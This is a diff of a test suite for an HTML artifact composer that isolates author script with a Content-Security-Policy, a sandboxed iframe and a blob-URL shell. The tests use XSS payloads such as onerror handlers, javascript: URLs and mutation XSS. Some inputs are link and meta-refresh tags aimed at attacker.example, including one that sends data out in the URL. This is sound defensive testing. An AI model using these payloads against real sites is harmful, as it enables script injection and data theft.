@@ -1,8 +1,7 @@
 // @vitest-environment jsdom
 //
-// DOMPurify (composeHtmlDocument's sanitizer) needs a full, browser-faithful DOM;
-// happy-dom's is too partial and strips all tags to text, so these tests would
-// pass trivially and prove nothing. jsdom is DOMPurify's reference environment.
+// Composition is pure string work, but `downloadHtmlArtifact` builds a Blob and
+// drives an <a> element, so these tests need a DOM.
 //
 // Copyright Thales 2026
 //
@@ -18,15 +17,21 @@
 // See the License for the specific language governing permissions and
 // limitations under the License.
 
-// Tests for the security-critical composition (RFC §4.7): the CSP <meta> must be
-// present in EVERY composed document, CSS must be injected, and both a full
-// document and a bare fragment must compose to a valid single document.
+// Tests for the security-critical composition (RFC §4.7). Author script is allowed
+// and must SURVIVE composition; what these tests pin is the isolation around it —
+// the CSP <meta> in every composed document, `allow-scripts` without
+// `allow-same-origin` on every frame, and the sandboxed shell on the two output
+// paths (new tab, download) that would otherwise host the artifact as the top
+// document of an origin the app shares.
 
-import { describe, expect, it } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import {
+  ARTIFACT_SANDBOX,
   artifactFileName,
+  artifactHasScript,
   composeHtmlDocument,
-  newTabDocument,
+  downloadHtmlArtifact,
+  sandboxedShellDocument,
   zoomIn,
   zoomOut,
   ZOOM_LEVELS,
@@ -47,8 +52,6 @@ describe("composeHtmlDocument", () => {
       "",
     );
     expect(out).toContain(CSP);
-    // Sanitization keeps the meaningful body content (a stray inert <title>
-    // node may survive in the body, but no script/handler does — see below).
     expect(out).toContain("body-text");
   });
 
@@ -90,8 +93,8 @@ describe("composeHtmlDocument", () => {
   });
 
   it("places the CSP before any surviving author subresource (egress ordering)", () => {
-    // An <img> survives sanitization (it is presentational); its external fetch
-    // must still be governed by our CSP, so the meta must appear BEFORE it.
+    // An author <img> reaches the body untouched; its external fetch must still be
+    // governed by our CSP, so the meta must appear BEFORE it.
     const doc = '<html><img src="https://attacker.example/leak.png"><head></head><body>x</body></html>';
     const out = composeHtmlDocument(doc, "");
     const cspIdx = out.indexOf("Content-Security-Policy");
@@ -101,19 +104,21 @@ describe("composeHtmlDocument", () => {
     expect(cspIdx).toBeLessThan(imgIdx);
   });
 
-  it("strips egress / navigation tags outright (<link>, <base>, <meta>)", () => {
+  it("neutralizes egress / navigation tags by policy rather than by stripping", () => {
+    // Nothing is stripped any more, so an author <link>/<base> DOES reach the body.
+    // What makes it inert is the CSP that precedes it: `default-src 'none'` refuses
+    // the stylesheet fetch and `base-uri 'none'` refuses to retarget relative URLs.
     const doc =
       '<link rel="stylesheet" href="https://attacker.example/leak.css">' +
       '<base href="https://attacker.example/">' +
-      '<meta http-equiv="refresh" content="0;url=https://attacker.example">' +
       "<p>ok</p>";
     const out = composeHtmlDocument(doc, "");
     expect(out).toContain("<p>ok</p>");
-    // None of the author's egress/navigation tags survive to the body.
-    expect(out).not.toContain("attacker.example");
-    expect(out.toLowerCase()).not.toContain("<link");
-    expect(out.toLowerCase()).not.toContain("<base");
-    expect(out.toLowerCase()).not.toContain("refresh");
+    const cspIdx = out.indexOf(CSP);
+    expect(cspIdx).toBeGreaterThan(-1);
+    expect(cspIdx).toBeLessThan(out.indexOf("attacker.example"));
+    expect(out).toContain("default-src 'none'");
+    expect(out).toContain("base-uri 'none'");
   });
 
   it("neutralizes a </style> breakout in the CSS", () => {
@@ -133,38 +138,85 @@ describe("composeHtmlDocument", () => {
   });
 });
 
-// Layer A — the sanitizer removes every script-bearing construct at the single
-// composition chokepoint, so no output path carries executable JS in its markup.
-// Each payload plants the marker `__pwn`; a clean composition contains neither the
-// marker nor any script/handler/URL that would have run it.
-describe("composeHtmlDocument strips executable JS (RFC §4.7 Layer A)", () => {
-  const VECTORS: [label: string, payload: string][] = [
-    ["<script> tag", "<script>window.__pwn=1</script>"],
-    ["img onerror", '<img src=x onerror="window.__pwn=1">'],
-    ["svg onload", '<svg onload="window.__pwn=1"></svg>'],
-    ["svg <script>", "<svg><script>window.__pwn=1</script></svg>"],
-    ["javascript: href", '<a href="javascript:window.__pwn=1">x</a>'],
-    ["inline onclick", '<div onclick="window.__pwn=1">x</div>'],
-    ["iframe js src", '<iframe src="javascript:window.__pwn=1"></iframe>'],
-    ["object data", '<object data="data:text/html,<script>window.__pwn=1</script>"></object>'],
-    ["embed", '<embed src="data:text/html,window.__pwn=1">'],
-    ["vbscript: href", '<a href="vbscript:window.__pwn=1">x</a>'],
-    ["formaction js", '<form><button formaction="javascript:window.__pwn=1">go</button></form>'],
-    ["mutation xss", '<noscript><p title="</noscript><img src=x onerror=window.__pwn=1>">'],
-    ["body onload", '<body onload="window.__pwn=1"><p>x</p></body>'],
+// Script is now the feature, so what must hold is that author JS SURVIVES intact
+// (a sanitizer would silently break every interactive artifact) while the policy
+// around it stays closed: inline script permitted, every network egress refused.
+describe("composeHtmlDocument keeps author script and closes the policy", () => {
+  const JS_PAYLOADS: [label: string, payload: string][] = [
+    ["<script> element", "<script>document.title='built'</script>"],
+    ["inline onclick", "<button onclick=\"this.textContent='ok'\">x</button>"],
+    ["svg onload", '<svg onload="this.dataset.ready=1"></svg>'],
+    ["module script", '<script type="module">export const a = 1;</script>'],
   ];
 
-  it.each(VECTORS)("neutralizes %s", (_label, payload) => {
+  it.each(JS_PAYLOADS)("passes %s through untouched", (_label, payload) => {
     const out = composeHtmlDocument(payload, "");
-    expect(out.toLowerCase()).not.toContain("<script");
-    expect(out).not.toContain("__pwn");
-    expect(out.toLowerCase()).not.toContain("javascript:");
-    expect(out.toLowerCase()).not.toContain("vbscript:");
-    // No `on…=` event-handler attribute survives (our own head markup has none).
-    expect(out).not.toMatch(/\son[a-z]+\s*=/i);
+    expect(out).toContain(payload);
   });
 
-  it("keeps legitimate static markup and inline <style>", () => {
+  it("permits inline script while refusing every network egress", () => {
+    const out = composeHtmlDocument("<script>1</script>", "");
+    expect(out).toContain("script-src 'unsafe-inline'");
+    // `default-src 'none'` is what still blocks fetch/XHR/WebSocket, remote
+    // scripts and every other subresource, so hostile JS cannot exfiltrate.
+    expect(out).toContain("default-src 'none'");
+    // Pin the directive itself: a policy widened to `data:` or `*` would still
+    // satisfy a "contains no URL" check on this fixed input.
+    expect(out).toContain("script-src 'unsafe-inline';");
+  });
+
+  it("defuses <link> elements, the one construct that egresses despite the policy", () => {
+    // `preconnect`/`dns-prefetch` perform no fetch, so no CSP directive reaches
+    // them; measured egressing a hostname even from a frame that cannot run script.
+    // Asserted through the PARSER: what matters is that no `link` element exists in
+    // the composed document, not that some substring is absent from its text.
+    const links = (author: string) =>
+      new DOMParser().parseFromString(composeHtmlDocument(author, ""), "text/html").querySelectorAll("link").length;
+
+    expect(
+      links(
+        '<link rel="preconnect" href="https://attacker.example"><link rel="stylesheet" href="https://a.example/x.css"><p>ok</p>',
+      ),
+    ).toBe(0);
+    // Two measured bypasses of a delete-the-match strip, both inert now.
+    // An unterminated tag: deletion needs a closing `>`, which the author withholds
+    // and the composed document then supplies from its own `</body>`.
+    expect(links('<p>ok</p><link rel=preconnect href="https://attacker.example" ')).toBe(0);
+    // And a tag the strip would MANUFACTURE, by splicing together what surrounded
+    // the text it cut out. The browser parses this author markup as no link at all.
+    expect(links('<li<link>nk rel=preconnect href="https://attacker.example">')).toBe(0);
+
+    expect(composeHtmlDocument("<p>ok</p>", "")).toContain("<p>ok</p>");
+  });
+
+  it("defuses author <meta>, which NAVIGATES the document past every fetch directive", () => {
+    // `<meta http-equiv="refresh" content="0;url=…">` is a navigation, and no CSP
+    // fetch directive covers one. The export and fit-width measuring frames load
+    // the composed document with no enclosing `frame-src` to catch it, so this is
+    // the only thing standing between author markup and an off-origin navigation
+    // carrying data in the URL. DOMPurify used to drop <meta>; it no longer runs.
+    const authorMetas = (author: string) => {
+      const doc = new DOMParser().parseFromString(composeHtmlDocument(author, ""), "text/html");
+      // OUR injected CSP/charset/viewport metas live in <head> and must survive;
+      // only what the author supplied, which lands in <body>, is defused.
+      return doc.body.querySelectorAll("meta").length;
+    };
+
+    expect(authorMetas('<meta http-equiv="refresh" content="0;url=https://attacker.example/?d=1"><p>ok</p>')).toBe(0);
+    // Unterminated, the same bypass shape the <link> defusing is written against.
+    expect(authorMetas('<p>ok</p><meta http-equiv=refresh content="0;url=https://attacker.example" ')).toBe(0);
+
+    // Our own head metas are untouched — the policy still has to reach the parser.
+    expect(composeHtmlDocument("<p>ok</p>", "")).toContain("Content-Security-Policy");
+    expect(composeHtmlDocument("<p>ok</p>", "")).toContain("<p>ok</p>");
+  });
+
+  it("leaves markup that merely DISPLAYS a <link> tag as text alone", () => {
+    const out = composeHtmlDocument("<pre>&lt;link rel=preconnect&gt;</pre>", "");
+    expect(out).toContain("&lt;link rel=preconnect&gt;");
+  });
+
+  it("keeps legitimate markup and inline <style>", () => {
     const out = composeHtmlDocument(
       '<section class="card"><h1>Title</h1><style>.card{color:red}</style></section>',
       "",
@@ -174,35 +226,142 @@ describe("composeHtmlDocument strips executable JS (RFC §4.7 Layer A)", () => {
   });
 });
 
-// Layer B — the new tab's TOP document is a trusted, author-free shell whose only
-// body is a sandboxed iframe; the artifact rides escaped inside its srcdoc.
-describe("newTabDocument (RFC §4.7 Layer B — sandboxed shell)", () => {
-  it('hosts the artifact in a sandbox="" iframe with the content escaped in srcdoc', () => {
-    const out = newTabDocument("<h1>hi</h1>", "");
-    expect(out).toContain('<iframe sandbox=""');
-    // The composed document rides escaped inside srcdoc — its markup never parses
-    // at the shell's (author-free, same-origin) top level.
-    expect(out).toContain("&lt;h1&gt;hi&lt;/h1&gt;");
-    expect(out).not.toContain("<h1>hi</h1>");
+// The sandboxed shell. Two jobs: keep the artifact off its own origin, and carry
+// the `frame-src blob:` that stops it navigating itself out. Measured in Chrome 153
+// (preview shape, new tab and file:// alike): without that directive an artifact
+// doing `location.href="http://host/?d="+data` egresses; with it, 0 requests while
+// its script still runs. The artifact must therefore be a blob: URL, not srcdoc —
+// `frame-src` has nothing to match on `about:srcdoc`.
+describe("sandboxedShellDocument (RFC §4.7 — the sandboxed shell)", () => {
+  it("carries frame-src blob:, the only control that blocks self-navigation", () => {
+    const out = sandboxedShellDocument("<h1>hi</h1>", "");
+    expect(out).toContain("frame-src blob:");
+    // …and hands the artifact to the child as a blob: URL, so the directive matches.
+    expect(out).toContain("URL.createObjectURL");
+    expect(out).toContain('id="a"');
   });
 
-  it("never enables scripts or same-origin on the shell iframe", () => {
-    const out = newTabDocument("<p>x</p>", "");
-    expect(out).not.toContain("allow-scripts");
+  it("contains the meta-refresh vector by policy, not by stripping it", () => {
+    // This vector was in the old suite as a "must not survive composition"
+    // assertion, and removing it from the suite is how the self-navigation hole
+    // went unnoticed. It now reads the other way round: the meta DOES reach the
+    // artifact — nothing sanitizes it — and what stops it navigating out is the
+    // shell's frame-src. Deleting either half must fail a test.
+    const artifact = '<meta http-equiv="refresh" content="0;url=https://attacker.example">';
+    expect(composeHtmlDocument(artifact, "")).toContain("attacker.example");
+    expect(sandboxedShellDocument(artifact, "")).toContain("frame-src blob:");
+  });
+
+  it("NEVER grants same-origin alongside scripts", () => {
+    // The combination is what would let the content clear its own sandbox and
+    // reach the app origin. This is the single most important line in the file.
+    expect(ARTIFACT_SANDBOX).toBe("allow-scripts");
+    const out = sandboxedShellDocument("<p>x</p>", "");
+    expect(out).toContain(`sandbox="${ARTIFACT_SANDBOX}"`);
     expect(out).not.toContain("allow-same-origin");
   });
 
-  it("escapes double quotes so author content cannot break out of srcdoc", () => {
-    const out = newTabDocument('<a title="x">"</a>', "");
-    // Every author/content double-quote is entity-escaped; the only raw quotes
-    // left are the shell's own attribute delimiters.
-    expect(out).toContain("&quot;");
+  it("blocks WebRTC, which no fetch directive covers", () => {
+    expect(sandboxedShellDocument("<p>x</p>", "")).toContain("webrtc 'block'");
   });
 
-  it("passes a JS payload through inert — no script survives even one level down", () => {
-    const out = newTabDocument('<img src=x onerror="window.__pwn=1">', "");
-    expect(out).not.toContain("__pwn");
-    expect(out.toLowerCase()).not.toContain("onerror");
+  it("leaves the artifact no `<` at all inside the bootstrap literal", () => {
+    // Two bugs, both measured in the browser, both closed by escaping every `<`:
+    // the artifact's own `</script>` ended the shell's script block, and an unclosed
+    // `<!--` before a `<script` flipped the tokenizer into a state where `</script>`
+    // stops closing anything. Either way the bootstrap never ran and the frame
+    // stayed blank — so no author `<` may survive into that literal.
+    const out = sandboxedShellDocument("<script>window.x=1</script>", "");
+    expect(out).toContain("\\u003c/script>");
+    // Exactly one real closing tag: the bootstrap's own.
+    expect((out.match(/<\/script>/g) ?? []).length).toBe(1);
+
+    const commented = sandboxedShellDocument("<h1>a</h1><!-- <script>", "");
+    expect(commented).not.toContain("<!--");
+    expect(commented).toContain("\\u003c!--");
+    expect((commented.match(/<\/script>/g) ?? []).length).toBe(1);
+  });
+
+  it("parses no author markup at the shell's own top level", () => {
+    const out = sandboxedShellDocument("<h1>hi</h1>", "");
+    // The artifact rides inside a JS string literal with every `<` escaped, so no
+    // author element ever opens or closes at the shell's top level.
+    expect(out).not.toContain("<h1>hi</h1>");
+    expect(out).toContain("\\u003ch1>hi\\u003c/h1>");
+  });
+
+  it("passes the preview's zoom through to the artifact document", () => {
+    expect(sandboxedShellDocument("<p>x</p>", "", 0.5)).toContain("zoom:0.5");
+    expect(sandboxedShellDocument("<p>x</p>", "")).not.toContain("zoom:");
+  });
+});
+
+// The download is the one output path with no application around it: opened by
+// double-click, the file IS the top document on `file://`. It must therefore ship
+// the sandboxed shell, never the bare composed artifact.
+describe("downloadHtmlArtifact ships the sandboxed shell", () => {
+  let saved: Blob | null;
+  let clicked: boolean;
+
+  beforeEach(() => {
+    saved = null;
+    clicked = false;
+    vi.spyOn(URL, "createObjectURL").mockImplementation((blob: Blob | MediaSource) => {
+      saved = blob as Blob;
+      return "blob:stub";
+    });
+    vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => undefined);
+    vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {
+      clicked = true;
+    });
+  });
+
+  afterEach(() => vi.restoreAllMocks());
+
+  it("saves the shell, so a double-clicked file is still frame-src protected", async () => {
+    downloadHtmlArtifact("<script>window.x=1</script><h1>hi</h1>", "", "My Page");
+    expect(clicked).toBe(true);
+    expect(saved).not.toBeNull();
+    const text = await saved!.text();
+    expect(text).toContain("frame-src blob:");
+    expect(text).toContain(`sandbox="${ARTIFACT_SANDBOX}"`);
+    expect(text).not.toContain("allow-same-origin");
+    // The artifact — script included — never parses at the file:// top level.
+    expect(text).not.toContain("<h1>hi</h1>");
+  });
+});
+
+describe("artifactHasScript", () => {
+  it("spots a script element and an inline handler", () => {
+    expect(artifactHasScript("<script>1</script>")).toBe(true);
+    expect(artifactHasScript('<button onclick="f()">x</button>')).toBe(true);
+  });
+
+  it("spots a self-closing <script/>, which the parser turns into a real element", () => {
+    // `<script/>` is not `<script>` followed by space or `>`, so pattern matching
+    // misses it while the browser still runs it — the one case the toast is for.
+    expect(artifactHasScript("<script/>window.x=1</script><p>after</p>")).toBe(true);
+  });
+
+  it("spots a `javascript:` URL, which runs on activation", () => {
+    // `script-src 'unsafe-inline'` permits it, so such a page CAN execute and must
+    // get the stop control and the "captured before its JavaScript runs" warning.
+    expect(artifactHasScript('<a href="javascript:alert(1)">go</a>')).toBe(true);
+    expect(artifactHasScript('<a href=" JavaScript:alert(1)">go</a>')).toBe(true);
+    expect(artifactHasScript('<a href="https://example.com/javascript:x">go</a>')).toBe(false);
+  });
+
+  it("stays false for an artifact that merely DISPLAYS handler code as text", () => {
+    // A tutorial page showing escaped markup executes nothing; warning on it would
+    // make the toast noise. Only a parser can tell this from real markup.
+    expect(artifactHasScript('<pre>&lt;button onclick="go()"&gt;&lt;/pre>')).toBe(false);
+    expect(artifactHasScript("<pre>let online = true;</pre>")).toBe(false);
+    expect(artifactHasScript("<p>Statut : online = 42</p>")).toBe(false);
+  });
+
+  it("stays false for markup with nothing to execute", () => {
+    expect(artifactHasScript("<h1>hi</h1><p>text</p>")).toBe(false);
+    expect(artifactHasScript('<p class="online">x</p>')).toBe(false);
   });
 });
 
